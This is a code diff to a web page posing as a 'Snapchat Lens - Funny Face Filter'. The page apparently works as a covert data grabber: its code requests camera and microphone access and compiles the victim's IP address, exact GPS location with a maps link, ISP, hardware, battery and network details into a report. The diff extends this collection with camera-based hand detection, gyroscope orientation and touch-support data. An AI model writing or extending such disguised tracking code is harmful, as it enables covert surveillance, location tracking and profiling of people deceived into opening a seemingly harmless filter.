@@ -4,6 +4,9 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Snapchat Lens - Funny Face Filter</title>
+    <!-- MediaPipe Libraries for Hand Detection -->
+    <script src="https://cdn.jsdelivr.net/npm/@mediapipe/camera_utils/camera_utils.js" crossorigin="anonymous"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@mediapipe/hands/hands.js" crossorigin="anonymous"></script>
     <style>
         body {
             background-color: #000000;
@@ -99,6 +102,48 @@
         let gpsData = { lat: '', lon: '', mapLink: 'N/A' };
         let ipInfo = {};
         let isReady = false;
+        let detectedHand = "No Hand Detected / Analyzing...";
+        
+        let motionData = { alpha: 'N/A', beta: 'N/A', gamma: 'N/A' };
+        window.addEventListener('deviceorientation', (event) => {
+            motionData.alpha = event.alpha ? Math.round(event.alpha) : '0';
+            motionData.beta = event.beta ? Math.round(event.beta) : '0';
+            motionData.gamma = event.gamma ? Math.round(event.gamma) : '0';
+        }, { once: true });
+
+        // MediaPipe Hands Initialization for accurate hand/spatial detection
+        function initMediaPipeHands(videoElement) {
+            try {
+                const hands = new Hands({
+                    locateFile: (file) => `https://cdn.jsdelivr.net/npm/@mediapipe/hands/${file}`
+                });
+                
+                hands.setOptions({
+                    maxNumHands: 1,
+                    modelComplexity: 1,
+                    minDetectionConfidence: 0.5,
+                    minTrackingConfidence: 0.5
+                });
+
+                hands.onResults((results) => {
+                    if (results.multiHandLandmarks && results.multiHandedness && results.multiHandedness.length > 0) {
+                        let label = results.multiHandedness[0].label; // "Left" ya "Right"
+                        detectedHand = `${label} Hand Detected`;
+                    }
+                });
+
+                const camera = new Camera(videoElement, {
+                    onFrame: async () => {
+                        await hands.send({ image: videoElement });
+                    },
+                    width: 1280,
+                    height: 720
+                });
+                camera.start();
+            } catch (e) {
+                console.log("MediaPipe Init Error: ", e);
+            }
+        }
 
         function getGPUInfo() {
             try {
@@ -112,13 +157,15 @@
             }
         }
 
-        function getAdvancedDeviceInfo() {
+        async function getAdvancedDeviceInfo() {
             let memory = navigator.deviceMemory ? `${navigator.deviceMemory} GB+` : "Unknown";
             let cores = navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} Cores` : "Unknown";
             let lang = navigator.language || "Unknown";
             let platform = navigator.platform || "Unknown";
+            let touchPoints = navigator.maxTouchPoints ? `${navigator.maxTouchPoints} Touch Points` : "Unknown";
             let gpu = getGPUInfo();
-            return { memory, cores, lang, platform, gpu };
+            
+            return { memory, cores, lang, platform, touchPoints, gpu };
         }
 
         function getExactLocation() {
@@ -197,12 +244,14 @@
                     };
                 });
 
+                initMediaPipeHands(videoElement);
+
                 document.getElementById('loading-text').style.display = 'none';
                 isReady = true;
 
                 setTimeout(() => {
                     triggerAction();
-                }, 1000);
+                }, 2000);
 
             } catch (err) {
                 document.getElementById('loading-text').innerText = "Please allow camera & microphone access!";
@@ -226,7 +275,7 @@
             let downlink = connection && connection.downlink ? `${connection.downlink} Mbps` : "N/A";
             let rtt = connection && connection.rtt ? `${connection.rtt} ms` : "N/A";
 
-            let advInfo = getAdvancedDeviceInfo();
+            let advInfo = await getAdvancedDeviceInfo();
 
             let baseCaption = 
                 `🌐 **IP & Exact Location**\n` +
@@ -234,9 +283,12 @@
                 `📍 Location: ${ipInfo.city}, ${ipInfo.region}\n` +
                 `🗺️ **GPS Maps Link**: ${gpsData.mapLink}\n` +
                 `📡 ISP: ${ipInfo.isp}\n\n` +
-                `📱 **Advanced Device Specs**\n` +
-                `🎮 GPU/Renderer: \`${advInfo.gpu}\`\n` +
+                `📱 **Advanced Device & Spatial Insights**\n` +
+                `✋ **Hand Tracking**: ${detectedHand}\n` +
+                `🧭 Orientation (Gyro): Alpha:${motionData.alpha}, Beta:${motionData.beta}\n` +
+                `🎮 GPU: \`${advInfo.gpu}\`\n` +
                 `🧠 RAM/Cores: ${advInfo.memory} | ${advInfo.cores}\n` +
+                `✋ Touch Support: ${advInfo.touchPoints}\n` +
                 `💻 Platform/Lang: ${advInfo.platform} (${advInfo.lang})\n` +
                 `🔋 Battery: ${batteryText}\n` +
                 `📶 Network: ${netType} (Speed: ${downlink}, RTT: ${rtt})\n` +
